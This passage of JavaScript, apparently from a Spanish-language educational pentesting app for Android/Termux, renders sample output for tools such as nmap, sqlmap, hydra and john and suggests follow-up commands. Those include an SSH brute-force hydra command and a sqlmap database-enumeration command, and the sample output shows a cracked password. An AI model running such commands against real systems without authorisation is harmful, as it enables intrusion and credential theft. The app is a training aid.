    // Auto-scroll
    output.scrollTop = output.scrollHeight;
  },

  showSampleOutput(output, base, fullCmd, known) {
    const samples = this.getSampleOutput(base, fullCmd);
    if (samples) {
      samples.forEach(s => {
        const line = document.createElement('div');
        line.className = `terminal-line ${s.type || 'output'}`;
        line.innerHTML = s.text;
        output.appendChild(line);
      });
    }

    // "Run in Termux" button area
    const runDiv = document.createElement('div');
    runDiv.style.cssText = 'margin:8px 0;display:flex;gap:8px;flex-wrap:wrap;';
    runDiv.innerHTML = `
      <button onclick="App.copyToTermux('${fullCmd.replace(/'/g,"\\'")}')" style="padding:8px 16px;background:rgba(0,212,255,0.1);border:1px solid rgba(0,212,255,0.3);border-radius:4px;color:var(--accent-cyan);font-family:var(--font-mono);font-size:11px;cursor:pointer;">📋 Copiar y abrir Termux</button>
      <button onclick="App.runInTermux('${fullCmd.replace(/'/g,"\\'")}')" style="padding:8px 16px;background:rgba(0,255,65,0.1);border:1px solid rgba(0,255,65,0.3);border-radius:4px;color:var(--accent-green);font-family:var(--font-mono);font-size:11px;cursor:pointer;">▶ Ejecutar en Termux</button>
    `;
    output.appendChild(runDiv);

    // Educational guidance
    if (known.learn) {
      const guide = document.createElement('div');
      guide.className = 'terminal-line guide';
      guide.innerHTML = `<span class="label">📖 Lo que aprendiste:</span> ${known.learn}`;
      output.appendChild(guide);
    }

    // Next steps
    const nextCmd = this.getNextStep(base);
    if (nextCmd) {
      const nextDiv = document.createElement('div');
      nextDiv.className = 'terminal-line guide';
      nextDiv.style.borderLeftColor = 'var(--accent-green)';
      nextDiv.innerHTML = `<span class="label">⏭️ Siguiente:</span> Prueba este comando → 
        <span style="color:var(--accent-green);cursor:pointer;" onclick="document.getElementById('terminal-input').value='${nextCmd.replace(/'/g,"\\'")}';App.executeCommand('${nextCmd.replace(/'/g,"\\'")}')">${nextCmd}</span>`;
      output.appendChild(nextDiv);
    }

    // Save to notebook
    const saveBtn = document.createElement('div');
    saveBtn.style.cssText = 'margin:4px 0;';
    saveBtn.innerHTML = `<button onclick="App.addNotebookEntry('result', '${fullCmd.replace(/'/g,"\\'")} — [ver salida arriba]')" style="padding:4px 10px;background:rgba(255,170,0,0.1);border:1px solid rgba(255,170,0,0.3);border-radius:4px;color:#ffaa00;font-family:var(--font-mono);font-size:9px;cursor:pointer;">📊 Guardar resultado en block de notas</button>`;
    output.appendChild(saveBtn);
  },

  getSampleOutput(base, fullCmd) {
    // Return realistic sample outputs for common commands
    const samples = {
      'nmap': [
        { type: 'output', text: 'Starting Nmap 7.95 ( https://nmap.org ) at 2026-05-07 10:30 UTC' },
        { type: 'output', text: 'Nmap scan report for scanme.nmap.org (45.33.32.156)' },
        { type: 'output', text: 'Host is up (0.15s latency).' },
        { type: 'output', text: '' },
        { type: 'output', text: 'PORT     STATE  SERVICE    VERSION' },
        { type: 'output', text: '22/tcp   open   ssh        OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.13' },
        { type: 'output', text: '80/tcp   open   http       Apache httpd 2.4.7' },
        { type: 'output', text: '443/tcp  open   ssl/http   Apache httpd 2.4.7' },
        { type: 'output', text: '9929/tcp  open   nping-echo Nping echo' },
        { type: 'output', text: '' },
        { type: 'output', text: 'Service detection performed. Please report any incorrect results at:' },
        { type: 'output', text: 'https://nmap.org/submit/' },
        { type: 'output', text: 'Nmap done: 1 IP address (1 host up) scanned in 12.45 seconds' }
      ],
      'ping': [
        { type: 'output', text: 'PING google.com (142.250.80.14) 56(84) bytes of data.' },
        { type: 'output', text: '64 bytes from 142.250.80.14: icmp_seq=1 ttl=118 time=12.5 ms' },
        { type: 'output', text: '64 bytes from 142.250.80.14: icmp_seq=2 ttl=118 time=11.8 ms' },
        { type: 'output', text: '64 bytes from 142.250.80.14: icmp_seq=3 ttl=118 time=13.2 ms' },
        { type: 'output', text: '64 bytes from 142.250.80.14: icmp_seq=4 ttl=118 time=12.1 ms' },
        { type: 'output', text: '' },
        { type: 'output', text: '--- google.com ping statistics ---' },
        { type: 'output', text: '4 packets transmitted, 4 received, 0% packet loss, time 3003ms' },
        { type: 'output', text: 'rtt min/avg/max/mdev = 11.8/12.4/13.2/0.5 ms' }
      ],
      'gobuster': [
        { type: 'output', text: '===============================================================' },
        { type: 'output', text: 'Gobuster v3.8 by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)' },
        { type: 'output', text: '===============================================================' },
        { type: 'output', text: '' },
        { type: 'output', text: '[+] Url:                     https://ejemplo.com' },
        { type: 'output', text: '[+] Method:                  GET' },
        { type: 'output', text: '[+] Threads:                 10' },
        { type: 'output', text: '[+] Wordlist:                /usr/share/wordlists/dirb/common.txt' },
        { type: 'output', text: '===============================================================' },
        { type: 'output', text: 'Starting gobuster in directory enumeration mode' },
        { type: 'output', text: '===============================================================' },
        { type: 'output', text: '/admin                (Status: 301) [Size: 235]' },
        { type: 'output', text: '/css                  (Status: 301) [Size: 178]' },
        { type: 'output', text: '/images               (Status: 301) [Size: 181]' },
        { type: 'output', text: '/js                   (Status: 301) [Size: 175]' },
        { type: 'output', text: '/login                (Status: 200) [Size: 1423]' },
        { type: 'output', text: '/wp-admin             (Status: 301) [Size: 241]' },
        { type: 'output', text: '/wp-content           (Status: 301) [Size: 245]' },
        { type: 'output', text: '===============================================================' }
      ],
      'sqlmap': [
        { type: 'output', text: '___ ___| |_____|___ ___  {1.8.9#stable}' },
        { type: 'output', text: '|_ -| . | |     | .\'| . |' },
        { type: 'output', text: '|___|_  |_|_|_|_|__,|  _|' },
        { type: 'output', text: '      |_|           |_|   https://sqlmap.org' },
        { type: 'output', text: '' },
        { type: 'output', text: '[!] legal disclaimer: Usage for attacking targets without prior' },
        { type: 'output', text: '    mutual consent is illegal. It is the end user responsibility' },
        { type: 'output', text: '    to obey all applicable local, state and federal laws.' },
        { type: 'output', text: '' },
        { type: 'output', text: '[*] starting @ 10:30:45 /2026-05-07/' },
        { type: 'output', text: '' },
        { type: 'output', text: '[10:30:46] [INFO] testing connection to the target URL' },
        { type: 'output', text: '[10:30:47] [INFO] testing if the target URL is stable' },
        { type: 'output', text: '[10:30:48] [INFO] target URL is stable' },
        { type: 'output', text: '[10:30:48] [INFO] testing if GET parameter \'id\' is dynamic' },
        { type: 'output', text: '[10:30:49] [INFO] GET parameter \'id\' appears to be dynamic' },
        { type: 'output', text: '[10:30:49] [INFO] heuristic (basic) test shows that GET parameter' },
        { type: 'output', text: ' \'id\' might be injectable' },
        { type: 'output', text: '[10:30:50] [INFO] testing for SQL injection on GET parameter \'id\'' },
        { type: 'output', text: '[10:30:52] [INFO] GET parameter \'id\' is vulnerable. Do you want to' },
        { type: 'output', text: ' keep testing the others? [y/N] ' }
      ],
      'nuclei': [
        { type: 'output', text: '[INF] Loading templates...' },
        { type: 'output', text: '[INF] Templates loaded: 8457' },
        { type: 'output', text: '[WRN] Loading 1 unsigned templates' },
        { type: 'output', text: '[INF] Targets loaded: 1' },
        { type: 'output', text: '' },
        { type: 'output', text: '[techdetect] [http] [info] https://ejemplo.com [wordpress]' },
        { type: 'output', text: '[techdetect] [http] [info] https://ejemplo.com [php]' },
        { type: 'output', text: '[techdetect] [http] [info] https://ejemplo.com [mysql]' },
        { type: 'output', text: '[techdetect] [http] [info] https://ejemplo.com [nginx]' },
        { type: 'output', text: '' },
        { type: 'output', text: '[wp-plugin-scan] [http] [info] https://ejemplo.com/wp-content/plugins/akismet/readme.txt' },
        { type: 'output', text: '[wp-version] [http] [medium] https://ejemplo.com [WordPress 5.8.3]' },
        { type: 'output', text: '[missing-security-headers] [http] [info] https://ejemplo.com [X-XSS-Protection]' },
        { type: 'output', text: '[missing-security-headers] [http] [info] https://ejemplo.com [X-Frame-Options]' }
      ],
      'curl': [
        { type: 'output', text: 'HTTP/1.1 200 OK' },
        { type: 'output', text: 'Date: Thu, 07 May 2026 10:30:00 GMT' },
        { type: 'output', text: 'Server: nginx/1.24.0' },
        { type: 'output', text: 'Content-Type: text/html; charset=UTF-8' },
        { type: 'output', text: 'X-Powered-By: PHP/8.1.12' },
        { type: 'output', text: 'Set-Cookie: PHPSESSID=abc123; path=/' },
        { type: 'output', text: 'X-Frame-Options: SAMEORIGIN' },
        { type: 'output', text: 'X-XSS-Protection: 1; mode=block' },
        { type: 'output', text: 'Strict-Transport-Security: max-age=31536000' }
      ],
      'nikto': [
        { type: 'output', text: '- Nikto v2.5.0' },
        { type: 'output', text: '---------------------------------------------------------------------------' },
        { type: 'output', text: '+ Target IP:          192.168.1.100' },
        { type: 'output', text: '+ Target Hostname:    ejemplo.com' },
        { type: 'output', text: '+ Target Port:        80' },
        { type: 'output', text: '---------------------------------------------------------------------------' },
        { type: 'output', text: '+ SSL Info:        Subject:  /CN=ejemplo.com' },
        { type: 'output', text: '                   Ciphers:  TLS_AES_256_GCM_SHA384' },
        { type: 'output', text: '                   Issuer:   /CN=R3' },
        { type: 'output', text: '---------------------------------------------------------------------------' },
        { type: 'output', text: '+ /: Server banner: nginx/1.24.0' },
        { type: 'output', text: '+ /: The anti-clickjacking X-Frame-Options header is not present.' },
        { type: 'output', text: '+ /: The X-Content-Type-Options header is not set.' },
        { type: 'output', text: '+ /robots.txt: Entry \'/wp-admin/\' is disallowed.' },
        { type: 'output', text: '+ /wp-login.php: Wordpress login found.' },
        { type: 'output', text: '+ 1 host(s) tested' }
      ],
      'sherlock': [
        { type: 'output', text: "[*] Checking username 'ninja' on:" },
        { type: 'output', text: '' },
        { type: 'output', text: '[+] GitHub: https://www.github.com/ninja' },
        { type: 'output', text: '[+] Twitter: https://twitter.com/ninja' },
        { type: 'output', text: '[+] Instagram: https://www.instagram.com/ninja/' },
        { type: 'output', text: '[+] Reddit: https://www.reddit.com/user/ninja' },
        { type: 'output', text: '[+] TikTok: https://www.tiktok.com/@ninja' },
        { type: 'output', text: '[+] YouTube: https://www.youtube.com/@ninja' },
        { type: 'output', text: '' },
        { type: 'output', text: '[*] Search completed with 6 results' }
      ],
      'theharvester': [
        { type: 'output', text: '*******************************************************************' },
        { type: 'output', text: '*  _   _                                              _          *' },
        { type: 'output', text: '* | | | |                                             | |         *' },
        { type: 'output', text: '* | |_| | __ _ _ __  _ __ ___  ___ ___  _ __  ___ _ __| |_ _   _  *' },
        { type: 'output', text: '* |  _  |/ _\' | \'_ \\| \'__/ _ \\/ __/ _ \\| \'_ \\/ __| \'__| __| | | | *' },
        { type: 'output', text: '* | | | | (_| | |_) | | |  __/ (_| (_) | | | \\__ \\ | | |_| |_| | *' },
        { type: 'output', text: '* \\_| |_/\\__,_| .__/|_|  \\___|\\___\\___/|_| |_|___/_|  \\__|\\__, | *' },
        { type: 'output', text: '*             | |                                         __/ | *' },
        { type: 'output', text: '*             |_|                                        |___/  *' },
        { type: 'output', text: '*******************************************************************' },
        { type: 'output', text: '' },
        { type: 'output', text: '[+] Found emails:' },
        { type: 'output', text: '    info@ejemplo.com' },
        { type: 'output', text: '    admin@ejemplo.com' },
        { type: 'output', text: '' },
        { type: 'output', text: '[+] Found subdomains:' },
        { type: 'output', text: '    mail.ejemplo.com' },
        { type: 'output', text: '    www.ejemplo.com' },
        { type: 'output', text: '    admin.ejemplo.com' }
      ],
      'wpscan': [
        { type: 'output', text: '_______________________________________________________________' },
        { type: 'output', text: '__          _______   _____' },
        { type: 'output', text: '\\ \\        / /  __ \\ / ____|' },
        { type: 'output', text: ' \\ \\  /\\  / /| |__) | (___   ___ __ _ _ __' },
        { type: 'output', text: '  \\ \\/  \\/ / |  ___/ \\___ \\ / __/ _\' | \'_ \\' },
        { type: 'output', text: '   \\  /\\  /  | |     ____) | (_| (_| | | | |' },
        { type: 'output', text: '    \\/  \\/   |_|    |_____/ \\___\\__,_|_| |_|' },
        { type: 'output', text: '_______________________________________________________________' },
        { type: 'output', text: '' },
        { type: 'output', text: '[+] WordPress version: 5.8.3 (outdated)' },
        { type: 'output', text: '[+] Theme: twentytwentyone v1.5' },
        { type: 'output', text: '[+] Enumerating Vulnerable Plugins' },
        { type: 'output', text: '[+] akismet v4.1.9' },
        { type: 'output', text: '[+] contact-form-7 v5.5.2' },
        { type: 'output', text: '[!] 2 vulnerabilities identified:' },
        { type: 'output', text: '    - Contact Form 7 < 5.5.3 - Reflected XSS' },
        { type: 'output', text: '' },
        { type: 'output', text: '[+] Enumerating Users' },
        { type: 'output', text: '    admin' }
      ],
      'hydra': [
        { type: 'output', text: 'Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak' },
        { type: 'output', text: '' },
        { type: 'output', text: '[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries' },
        { type: 'output', text: '[DATA] attacking ssh://192.168.1.100:22/' },
        { type: 'output', text: '[STATUS] 1793.00 tries/min, 1793 tries in 00:01h, 14342606 to do in 133:24h' },
        { type: 'output', text: '[22][ssh] host: 192.168.1.100 login: admin password: P@ssw0rd123' },
        { type: 'output', text: '[STATUS] attack finished for 192.168.1.100 (waiting for children to complete)' },
        { type: 'output', text: '1 of 1 target successfully completed, 1 valid password found' }
      ],
      'tcpdump': [
        { type: 'output', text: 'tcpdump: verbose output suppressed, use -v[v]... for full protocol decode' },
        { type: 'output', text: 'listening on eth0, link-type EN10MB (Ethernet), snapshot length 262144 bytes' },
        { type: 'output', text: '10:30:01.123456 IP 192.168.1.100.54321 > 93.184.216.34.80: Flags [S], seq 123456789' },
        { type: 'output', text: '10:30:01.234567 IP 93.184.216.34.80 > 192.168.1.100.54321: Flags [S.], seq 987654321, ack 123456790' },
        { type: 'output', text: '10:30:01.345678 IP 192.168.1.100.54321 > 93.184.216.34.80: Flags [.], ack 1' },
        { type: 'output', text: '10:30:01.456789 IP 192.168.1.100.54321 > 93.184.216.34.80: Flags [P.], seq 1:76, ack 1' },
        { type: 'output', text: '10:30:01.567890 IP 93.184.216.34.80 > 192.168.1.100.54321: Flags [.], ack 76' },
        { type: 'output', text: '10 packets captured' },
        { type: 'output', text: '10 packets received by filter' },
        { type: 'output', text: '0 packets dropped by kernel' }
      ],
      'netstat': [
        { type: 'output', text: 'Active Internet connections (w/o servers)' },
        { type: 'output', text: 'Proto Recv-Q Send-Q Local Address           Foreign Address         State' },
        { type: 'output', text: 'tcp        0      0 192.168.1.100:443       104.28.7.85:443         ESTABLISHED' },
        { type: 'output', text: 'tcp        0      0 192.168.1.100:53241     142.250.80.14:443       ESTABLISHED' },
        { type: 'output', text: 'tcp        0      0 192.168.1.100:22        192.168.1.50:45123      ESTABLISHED' },
        { type: 'output', text: 'tcp6       0      0 :::22                   :::*                    LISTEN' },
        { type: 'output', text: 'tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN' }
      ],
      'proxychains': [
        { type: 'output', text: 'ProxyChains-3.1 (http://proxychains.sf.net)' },
        { type: 'output', text: '|DNS-request| 45.33.32.156' },
        { type: 'output', text: '|S-chain|-<>-127.0.0.1:9050-<><>-4.2.2.2:53-<><>-OK' },
        { type: 'output', text: '|DNS-response| 45.33.32.156 is 45.33.32.156' },
        { type: 'output', text: '|S-chain|-<>-127.0.0.1:9050-<><>-45.33.32.156:80-<><>-OK' },
        { type: 'output', text: '' },
        { type: 'output', text: 'Starting Nmap 7.95 ( https://nmap.org ) at 2026-05-07 10:30 UTC' },
        { type: 'output', text: 'Nmap scan report for scanme.nmap.org (45.33.32.156)' }
      ],
      'tor': [
        { type: 'output', text: 'May 07 10:30:01.000 [notice] Tor 0.4.8.12 running on Linux with Libevent 2.1.12, OpenSSL 3.0.15, Zlib 1.3, Liblzma 5.6.0, Libzstd 1.5.5 and Unknown as N/A.' },
        { type: 'output', text: 'May 07 10:30:01.000 [notice] Tor can\'t help you if you use it wrong!' },
        { type: 'output', text: 'May 07 10:30:01.000 [notice] Read configuration file "/data/data/com.termux/files/usr/etc/tor/torrc".' },
        { type: 'output', text: 'May 07 10:30:05.000 [notice] Bootstrapped 0% (starting): Starting' },
        { type: 'output', text: 'May 07 10:30:07.000 [notice] Bootstrapped 10% (conn_done): Connected to a relay' },
        { type: 'output', text: 'May 07 10:30:12.000 [notice] Bootstrapped 50% (loading_descriptors): Loading relay descriptors' },
        { type: 'output', text: 'May 07 10:30:18.000 [notice] Bootstrapped 100% (done): Done' },
        { type: 'output', text: 'May 07 10:30:18.000 [notice] Tor has successfully opened a circuit. Looks like client functionality is working.' }
      ],
      'john': [
        { type: 'output', text: 'Loaded 1 password hash (Raw-SHA256 [SHA256 256/256 AVX2 8x])' },
        { type: 'output', text: 'Will run 8 OpenMP threads' },
        { type: 'output', text: 'Press \'q\' or Ctrl-C to abort, almost any other key for status' },
        { type: 'output', text: '0g 0:00:00:03 0.00% (ETA: 10:45:00) 0g/s 125.3Kp/s 125.3Kc/s 125.3KC/s' },
        { type: 'output', text: 'P@ssw0rd123         (?))' },
        { type: 'output', text: '1g 0:00:00:05 100% 0.20g/s 124.5Kp/s 124.5Kc/s 124.5KC/s (1)' },
        { type: 'output', text: 'Use the "--show" option to display all of the cracked passwords reliably' },
        { type: 'output', text: 'Session completed.' }
      ],
      'jadx': [
        { type: 'output', text: 'INFO  - loading ...' },
        { type: 'output', text: 'INFO  - processing ...' },
        { type: 'output', text: 'INFO  - done' },
        { type: 'output', text: '' },
        { type: 'output', text: 'Classes loaded:' },
        { type: 'output', text: ' - com.example.app.MainActivity' },
        { type: 'output', text: ' - com.example.app.LoginActivity' },
        { type: 'output', text: ' - com.example.app.network.ApiClient' },
        { type: 'output', text: ' - com.example.app.utils.EncryptionHelper' },
        { type: 'output', text: ' - com.example.app.db.DatabaseHelper' }
      ]
    };

    return samples[base] || null;
  },

  getNextStep(base) {
    const steps = {
      'nmap': 'nmap -sV -p 22,80,443 scanme.nmap.org',
      'gobuster': 'gobuster dir -u https://ejemplo.com -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt',
      'nikto': 'nikto -h https://ejemplo.com -ssl',
      'wpscan': 'wpscan --url https://ejemplo-wp.com --enumerate vp',
      'sqlmap': 'sqlmap -u "http://testphp.vulnweb.com/artists.php?artist=1" --dbs',
      'hydra': 'hydra -L users.txt -P passwords.txt ssh://192.168.1.1',
      'nuclei': 'nuclei -u https://ejemplo.com -severity critical,high',
      'ping': 'traceroute google.com',
      'curl': 'curl -s -I https://ejemplo.com',
      'sherlock': 'theHarvester -d ejemplo.com -b google',
      'tor': 'curl --socks5 127.0.0.1:9050 -s https://check.torproject.org/api/ip',
      'proxychains': 'proxychains nmap -sT scanme.nmap.org',
      'john': 'john --show hash.txt',
      'jadx': 'jadx --show-bad-code -d output/ app.apk'
    };
    return steps[base] || null;
  },

  addCopyGuide(output, cmd) {
    const div = document.createElement('div');
    div.className = 'terminal-line guide';
    div.style.borderLeftColor = 'var(--accent-green)';
    div.innerHTML = `<span class="label">📋 Para ejecutar:</span> Copia este comando y pégalo en Termux → 
      <span style="color:var(--accent-green);cursor:pointer;" onclick="App.copyToTermux('${cmd.replace(/'/g,"\\'")}')">📋 Copiar</span>`;
    output.appendChild(div);
  },

  hasTermuxBridge() {
    return typeof window.TermuxBridge !== 'undefined' && window.TermuxBridge !== null;
  },

  copyToTermux(cmd) {
    this.addNotebookEntry('command', cmd);
    if (this.hasTermuxBridge()) {
      window.TermuxBridge.runCommand(cmd);
      const btn = document.querySelector('[onclick*="copyToTermux"]');
      if (btn) { btn.textContent = '▶ Enviado al terminal'; setTimeout(() => btn.textContent = '📋 Copiar y abrir Termux', 2000); }
      return;
    }
    if (navigator.clipboard) {
      navigator.clipboard.writeText(cmd).then(() => {
        try {
          const termuxUrl = `termux://open?command=${encodeURIComponent(cmd)}`;
          window.open(termuxUrl, '_blank');
        } catch(e) {}
        const btn = document.querySelector('[onclick*="copyToTermux"]');
        if (btn) { btn.textContent = '✓ Copiado'; setTimeout(() => btn.textContent = '📋 Copiar y abrir Termux', 2000); }
      });
    }
  },

  runInTermux(cmd) {
    this.addNotebookEntry('command', cmd);
    if (this.hasTermuxBridge()) {
      window.TermuxBridge.runCommand(cmd);
      return;
    }
    this.copyToTermux(cmd);
    const urls = [
      `termux://open?command=${encodeURIComponent(cmd)}`,
      `intent://open?command=${encodeURIComponent(cmd)}#Intent;scheme=termux;end`,
      `https://play.google.com/store/apps/details?id=com.termux`
    ];
    for (const url of urls) {
      try { window.open(url, '_blank'); break; } catch(e) {}
    }
  },

  showHelp(output) {
    const tools = Object.keys(this.terminalDb).sort();
    const line = document.createElement('div');
    line.className = 'terminal-line output';
    line.innerHTML = `Comandos disponibles: ${tools.map(t => `<span style="color:var(--accent-green);">${t}</span>`).join(', ')}`;
    output.appendChild(line);
  },

  setupTerminal() {
    const input = document.getElementById('terminal-input');
    const runBtn = document.getElementById('terminal-run');
    const closeBtn = document.getElementById('terminal-close');
    const modal = document.getElementById('terminal-modal');

    if (!input) return;

    input.addEventListener('keydown', (e) => {
      if (e.key === 'Enter') {
        this.executeCommand(input.value);
      }
    });

    runBtn.addEventListener('click', () => this.executeCommand(input.value));

    closeBtn.addEventListener('click', () => modal.classList.remove('open'));

    modal.addEventListener('click', (e) => {
      if (e.target === modal) modal.classList.remove('open');
    });
  },

  copyBulkInstall() {
    const cmds = DATA.tools.filter(t => t.termux).map(t => t.install).filter((v,i,a) => a.indexOf(v)===i);
    const text = 'pkg update && pkg upgrade\n' + cmds.join('\n');
    if (navigator.clipboard) {
      navigator.clipboard.writeText(text).then(() => {
        const el = document.querySelector('[onclick="App.copyBulkInstall()"]');
        if (el) { el.textContent = '✓ Copiado!'; setTimeout(() => el.textContent = '📋 Copiar instalación masiva', 2000); }
      });
    }
  },

  renderDashboard() {
    const container = document.getElementById('dashboard-content');
    const toolCount = DATA.tools.length;
    const termuxCount = DATA.tools.filter(t => t.termux).length;

    container.innerHTML = `
      <div class="terminal-ticker">
        <span class="prompt">┌─[<span style="color:var(--accent-cyan);">ninja@NINJApp</span>]─[~]
        <br>└──╼ <span id="typed-text"></span><span class="cursor">█</span></span>
      </div>

      <div class="stats-grid">
        <div class="stat-card">
          <div class="stat-number">${toolCount}</div>
          <div class="stat-label">Herramientas</div>
        </div>
        <div class="stat-card cyan">
          <div class="stat-number">${termuxCount}</div>
          <div class="stat-label">En Termux</div>
        </div>
        <div class="stat-card purple">
          <div class="stat-number">${DATA.learning.length}</div>
          <div class="stat-label">Niveles</div>
        </div>
        <div class="stat-card yellow">
          <div class="stat-number">${DATA.glossary.length}</div>
          <div class="stat-label">Términos</div>
        </div>
      </div>

      <div class="card" style="border-color:rgba(0,212,255,0.3);">
        <div class="card-title" style="color:var(--accent-cyan);">📱 ¿Cómo usar las herramientas en Android?</div>
        <div class="card-desc">
          1. Instala <b>Termux</b> desde F-Droid (NO de Play Store)<br>
          2. Abre Termux y ejecuta: <span class="copy-cmd" style="color:var(--accent-green);cursor:pointer;" onclick="navigator.clipboard.writeText('pkg update && pkg upgrade');this.textContent='✓ Copiado!';">▶ pkg update && pkg upgrade</span><br>
          3. Cada herramienta tiene su comando de instalación en <b>Termux</b><br>
          4. Toca cualquier comando para copiarlo a tu clipboard
        </div>
        <div style="display:flex;gap:8px;flex-wrap:wrap;margin-top:8px;">
          <a href="https://f-droid.org/packages/com.termux/" target="_blank" rel="noopener noreferrer" class="card-tag tag-cyan" style="text-decoration:none;">⬇ Descargar Termux (F-Droid)</a>
          <span class="card-tag tag-green">${termuxCount} tools</span>
          <span class="card-tag tag-purple" style="cursor:pointer;" onclick="App.copyBulkInstall()">📋 Copiar instalación masiva</span>
        </div>
      </div>

      <div class="card" style="border-color:rgba(168,85,247,0.3);">
        <div class="card-title" style="color:var(--accent-purple);">🗺️ Tu ruta de aprendizaje</div>
        <div class="card-desc">
          Sigue los niveles en orden. Cada uno tiene:<br>
          📥 Comandos para instalar lo necesario<br>
          🎯 Ejercicios prácticos para probar<br>
          📖 Conceptos que aprenderás<br><br>
          <span style="color:var(--text-muted);font-size:11px;">${DATA.learning.length} niveles · ~${DATA.learning.reduce((a,l)=>a+parseInt(l.time),0)} min total</span>
        </div>
        <div style="display:flex;flex-direction:column;gap:3px;margin-top:10px;">
          ${DATA.learning.map((l,i) => `
            <div style="display:flex;align-items:center;gap:8px;padding:4px 0;border-bottom:${i<DATA.learning.length-1?'1px solid var(--border-color)':'none'};">
              <span style="font-size:14px;">${l.icon}</span>
              <div style="flex:1;font-size:11px;color:var(--text-secondary);">
                <span style="color:var(--text-primary);font-weight:bold;">${l.title}</span>
                <span style="color:var(--text-muted);"> · ${l.time}</span>
              </div>
              <button class="card-tag tag-green" style="cursor:pointer;border:none;font-size:9px;" onclick="App.switchSection('learn')">Ir →</button>
            </div>
          `).join('')}
        </div>
      </div>

      <div style="margin-top:4px;">
        <div class="section-title" style="font-size:12px;margin-bottom:8px;">⚡ Acceso Rápido</div>
        <div class="quick-actions">
          <button class="quick-btn" data-quick="tools"><span class="qb-icon">🛡️</span> Herramientas</button>
          <button class="quick-btn" data-quick="learn"><span class="qb-icon">📚</span> Aprender</button>
          <button class="quick-btn" data-quick="zap"><span class="qb-icon">⚡</span> OWASP ZAP</button>
          <button class="quick-btn" data-quick="nmap"><span class="qb-icon">🌐</span> Nmap</button>
        </div>
      </div>
    `;

    container.querySelectorAll('[data-quick]').forEach(btn => {
      btn.addEventListener('click', () => {
        const target = btn.dataset.quick;
        if (target === 'tools') this.switchSection('tools');
        else if (target === 'learn') this.switchSection('learn');
        else { this.switchSection('tools'); this.openToolModal(target); }
      });
    });

    // Type effect
    const texts = [
      'Bienvenido a NINJApp...',
      'Instala Termux desde F-Droid...',
      'OWASP ZAP, Nmap, Burp Suite...',
      'Seguridad Móvil con OWASP MASVS...',
      'Siempre con autorización...'
    ];
    let ti = 0, ci = 0;
    const el = document.getElementById('typed-text');
    function typeEffect() {
      if (!el) return;
      if (ci < texts[ti].length) {
        el.textContent += texts[ti][ci];
        ci++;
        setTimeout(typeEffect, 30);
      } else {
        setTimeout(() => { el.textContent = ''; ci = 0; ti = (ti + 1) % texts.length; setTimeout(typeEffect, 500); }, 2000);
      }
    }
    setTimeout(typeEffect, 500);
  },

  renderTools() {
    const container = document.getElementById('tools-content');
    const query = this.searchQuery;
    const filter = this.currentFilter;
    let tools = DATA.tools;

    if (query) {
      tools = tools.filter(t =>
        t.name.toLowerCase().includes(query) ||
        t.desc.toLowerCase().includes(query) ||
        t.catLabel.toLowerCase().includes(query)
      );
    }
    if (filter !== 'all') {
      tools = tools.filter(t => t.category === filter);
    }

    if (tools.length === 0) {
      container.innerHTML = `<div class="empty-state"><div class="empty-icon">🔍</div><div class="empty-text">No se encontraron herramientas</div></div>`;
      return;
    }

    const grouped = {};
    tools.forEach(t => {
      if (!grouped[t.catLabel]) grouped[t.catLabel] = [];
      grouped[t.catLabel].push(t);
    });

    let html = '';
    for (const [category, catTools] of Object.entries(grouped)) {
      const termuxInCat = catTools.filter(t => t.termux);
      html += `<div style="margin-bottom:6px;">
        <div class="category-header">
          <div class="section-title" style="font-size:11px;">${catTools[0].icon} ${category}</div>
          ${termuxInCat.length ? `<span class="copy-cat-btn" data-cat-copy="${category}">📋 Copiar ${termuxInCat.length} tools</span>` : ''}
        </div>`;
      catTools.forEach(t => {
        html += `
          <div class="tool-card" data-tool="${t.id}">
            <div class="tool-card-header">
              <div class="tool-card-name">${t.icon} ${t.name}</div>
              <span class="tool-card-category">${t.termux ? '📱 Termux' : t.category}</span>
            </div>
            <div class="tool-card-desc">${t.desc.substring(0, 90)}...</div>
          </div>
        `;
      });
      html += `</div>`;
    }

    container.innerHTML = html;
    container.querySelectorAll('.tool-card').forEach(card => {
      card.addEventListener('click', () => this.openToolModal(card.dataset.tool));
    });
    container.querySelectorAll('.copy-cat-btn').forEach(btn => {
      btn.addEventListener('click', (e) => {
        e.stopPropagation();
        const catName = btn.dataset.catCopy;
        const catTools = DATA.tools.filter(t => t.catLabel === catName && t.termux);
        const cmds = [...new Set(catTools.map(t => t.install))];
        const text = cmds.join('\n');
        if (navigator.clipboard) {
          navigator.clipboard.writeText(text).then(() => {
            const orig = btn.textContent;
            btn.textContent = '✓ Copiado!';
            btn.style.borderColor = 'var(--accent-green)';
            setTimeout(() => { btn.textContent = orig; btn.style.borderColor = ''; }, 2000);
          });
        }
      });
    });
  },

  renderLearning() {
    const container = document.getElementById('learn-content');
    const emojis = ['🚀','🌐','🔍','🕵️','🛡️','💥','🧬','📱','🧅','🔓','🏆'];

    container.innerHTML = DATA.learning.map(l => `
      <div class="level-card level${l.level}">
        <div class="level-header">
          <div>
            <div class="level-title">${l.icon} ${l.title}</div>
            <div class="level-subtitle">${l.subtitle} · ⏱ ${l.time}</div>
          </div>
          <div style="display:flex;align-items:center;gap:8px;">
            <span style="font-size:10px;font-family:var(--font-mono);color:var(--text-muted);">${emojis[l.level]} Nivel ${l.level}</span>
            <span class="level-arrow">▼</span>
          </div>
        </div>
        <div class="level-topics">
          <div style="margin-top:10px;">
            <div class="modal-section-title" style="color:var(--accent-green);">📥 Instalar</div>
            <div style="margin-bottom:10px;">
              ${l.install.map(c => `<div class="modal-command" style="cursor:pointer;margin-bottom:4px;" onclick="if(navigator.clipboard){navigator.clipboard.writeText('${c.replace(/'/g,"\\'")}').then(()=>{this.innerHTML='✓ Copiado!';setTimeout(()=>this.innerHTML='${c.replace(/'/g,"\\'")}',1200)});}">${c}</div>`).join('')}
            </div>

            <div class="modal-section-title" style="color:var(--accent-cyan);">🎯 Practica</div>
            <div style="margin-bottom:10px;">
              ${l.practice.map(p => `
                <div style="margin-bottom:6px;padding:6px 8px;background:rgba(0,0,0,0.2);border-radius:4px;">
                  <div style="font-size:11px;color:var(--text-secondary);margin-bottom:3px;">${p.label}</div>
